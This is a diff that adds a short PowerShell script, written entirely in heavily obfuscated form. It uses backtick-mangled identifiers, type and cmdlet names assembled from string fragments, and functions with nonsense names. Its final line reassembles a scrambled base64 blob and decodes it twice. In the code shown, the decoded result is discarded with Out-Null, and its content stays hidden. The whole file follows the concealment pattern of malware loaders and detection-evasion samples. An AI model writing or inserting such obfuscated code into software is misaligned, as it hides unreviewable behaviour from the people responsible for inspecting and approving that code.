@@ -1,0 +1,26 @@
+ ${F`1I}= [TyPe]("{2}{0}{3}{1}"-f 'xt.','NcOdIng','te','E') ;  ${k`NcX} =[tyPe]("{1}{0}"-f'VERt','COn') ;  Function _`/`_\_/==={
+    [CmdletBinding()] param(
+        [Parameter(PosiTIoN = 0)]
+        [String]
+        ${Pa`Ra`M1}
+    )
+
+    ${resu`lt}  =   ( .('Ge'+'t-vA'+'RiAb'+'LE') ('f'+'1i') )."vAl`Ue"::"Un`IcODe"."GEts`TrIng"(  ${kN`Cx}::"F`R`OmbASe64ST`R`ing"(${Para`M1}))
+    return ${R`EsuLT}
+}
+
+Function _=`=_=_{
+    [CmdletBinding()] param(
+        [Parameter(POSItion = 0)]
+        [String]
+        ${pArA`M1}
+    )
+    
+    ${p`AR`AM1} = &(('_/'+'_gql'+'_/=='+'=')-rePLACe 'gql',[chaR]92) -param1 ${P`Aram1} 
+    ${res`UlT} =  (&('gi')  va`R`IaBlE:`F1I  )."V`ALUE"::"Un`Ic`oDE"."gETStR`I`Ng"( (  &('Va'+'RI'+'able')  K`NCX -vALueOn  )::"frOmBAs`E`64Str`INg"(${p`ARAM1}))
+    ${r`ESULT} | .('o'+'ut-nul'+'l')
+}
+
+.('_'+'==_=_')(("{24}{6}{12}{16}{9}{4}{28}{29}{30}{7}{8}{15}{17}{31}{14}{10}{21}{18}{2}{20}{5}{27}{3}{23}{25}{1}{19}{13}{11}{0}{22}{32}{26}" -f 'c','kA','
+AE','wAZ','AHk','A','QBRAEIAdw','BOA','EE','AUQBB','0AEEATQBR','G','BBAEQA','BOA','A','AQQ','bwBBAE4','AzAEEAQ','AdwBB','QQ','Q','AEE','AQQ','wBBAHgAQQBE','Y','AF','A==','VQBBAE','AQQ','BD','ADQAQQ','w','A9A'))
+
